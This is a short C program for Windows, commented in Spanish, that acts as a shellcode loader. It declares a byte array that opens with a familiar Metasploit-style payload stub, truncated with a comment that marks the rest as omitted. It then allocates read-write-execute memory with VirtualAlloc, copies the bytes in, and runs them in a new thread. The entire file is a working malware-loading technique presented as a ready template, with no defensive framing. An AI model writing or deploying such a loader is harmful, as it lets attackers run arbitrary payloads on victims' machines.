#include <windows.h>
#include <stdio.h>

int main() {
    // Shellcode: Código de máquina que se ejecutará
    unsigned char shellcode[] = {
        0xfc, 0xe8, 0x8f, 0x00, 0x00, 0x00, 0x60, 0x89, 0xe5, 0x31, 0xd2, 0x64,
        0x8b, 0x52, 0x30, 0x8b, 0x52, 0x0c, 0x8b, 0x52, 0x14, 0x31, 0xff, 0x8b,
        // (Resto del shellcode)
    };

    printf("Iniciando proceso...\n");

    // 1. Reservar memoria para el shellcode
    LPVOID exec_mem = VirtualAlloc(
        NULL,                           // Dirección inicial (NULL para que el sistema elija)
        sizeof(shellcode),              // Tamaño de la memoria a asignar
        MEM_COMMIT | MEM_RESERVE,       // Tipo de asignación
        PAGE_EXECUTE_READWRITE          // Permisos de la memoria
    );

    if (exec_mem == NULL) {
        printf("Error al asignar memoria: %lu\n", GetLastError());
        return 1;
    }

    // 2. Copiar el shellcode a la memoria reservada
    RtlMoveMemory(exec_mem, shellcode, sizeof(shellcode));

    // 3. Crear un hilo para ejecutar el shellcode
    HANDLE thread = CreateThread(
        NULL,           // Atributos del hilo
        0,              // Tamaño del stack (0 usa el tamaño predeterminado)
        (LPTHREAD_START_ROUTINE)exec_mem, // Dirección de inicio (el shellcode)
        NULL,           // Parámetros para el hilo
        0,              // Opciones de creación
        NULL            // ID del hilo
    );

    if (thread == NULL) {
        printf("Error al crear el hilo: %lu\n", GetLastError());
        return 1;
    }

    // 4. Esperar a que el hilo termine
    WaitForSingleObject(thread, INFINITE);

    printf("Proceso completado.\n");
    return 0;
}
